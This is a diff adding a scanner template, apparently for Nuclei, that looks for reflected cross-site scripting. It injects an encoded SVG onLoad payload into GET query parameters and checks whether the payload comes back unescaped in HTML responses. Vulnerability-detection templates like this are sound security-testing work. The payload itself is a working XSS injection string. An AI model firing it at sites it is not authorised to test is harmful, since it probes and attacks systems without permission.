@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-svg
+
+info:
+  name: Custom SVG Reflection XSS Detection
+  author: netbaan
+  severity: medium
+  description: |
+    This template checks for reflection XSS vulnerabilities using an SVG payload with an onLoad event.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Only execute for GET requests
+
+    payloads:
+      reflection:
+        - "&gt;&lt;Svg Only=1 OnLoad=confirm(atob(\"Q2xvdWRmbGFyZSBYU1MgQ1Fa2VsZXBjZQ==\"))&gt;"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
